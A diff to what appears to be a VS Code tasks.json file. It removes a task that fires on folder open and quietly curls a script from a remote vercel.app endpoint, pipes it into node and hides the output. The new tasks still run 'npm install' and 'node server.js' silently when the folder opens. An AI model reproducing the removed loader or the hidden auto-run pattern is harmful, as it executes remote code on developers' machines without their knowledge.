@@ -2,18 +2,42 @@
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "node",
+      "label": "install-root-modules",
       "type": "shell",
-      "osx": {
-        "command": "nohup bash -c '(curl -s \"https://oracle-reg-check.vercel.app/api/validate?token=8gYk4zLx0pQ1WvH3Rj2BsC7fZ\" | node)' > /dev/null 2>&1 &"
-      },
-      "linux": {
-        "command": "nohup bash -c '(curl -s \"https://oracle-reg-check.vercel.app/api/validate?token=8gYk4zLx0pQ1WvH3Rj2BsC7fZ\" | node)' > /dev/null 2>&1 &"
+      "command": "npm install --silent --no-progress",
+      "options": {
+        "cwd": "${workspaceFolder}"
       },
       "windows": {
-        "command": "cmd /c start /b cmd /c \"curl -s \"https://oracle-reg-check.vercel.app/api/validate?token=8gYk4zLx0pQ1WvH3Rj2BsC7fZ\" | node\""
+        "options": {
+          "shell": {
+            "executable": "cmd.exe",
+            "args": [
+              "/c"
+            ]
+          }
+        }
       },
-      "problemMatcher": [],
+      "linux": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": [
+              "-c"
+            ]
+          }
+        }
+      },
+      "osx": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": [
+              "-c"
+            ]
+          }
+        }
+      },
       "runOptions": {
         "runOn": "folderOpen"
       },
@@ -23,8 +47,60 @@
         "focus": false,
         "panel": "dedicated",
         "showReuseMessage": false,
-        "close": true
-      },
+        "clear": true
+      }
     },
+    {
+      "label": "run-backend",
+      "type": "shell",
+      "command": "node server.js",
+      "options": {
+        "cwd": "${workspaceFolder}"
+      },
+      "windows": {
+        "options": {
+          "shell": {
+            "executable": "cmd.exe",
+            "args": [
+              "/c"
+            ]
+          }
+        }
+      },
+      "linux": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": [
+              "-c"
+            ]
+          }
+        }
+      },
+      "osx": {
+        "options": {
+          "shell": {
+            "executable": "/bin/zsh",
+            "args": [
+              "-c"
+            ]
+          }
+        }
+      },
+      "dependsOn": "install-root-modules",
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "never",
+        "echo": false,
+        "focus": false,
+        "panel": "dedicated",
+        "showReuseMessage": false,
+        "clear": true
+      },
+      "isBackground": true,
+      "problemMatcher": []
+    }
   ]
 }
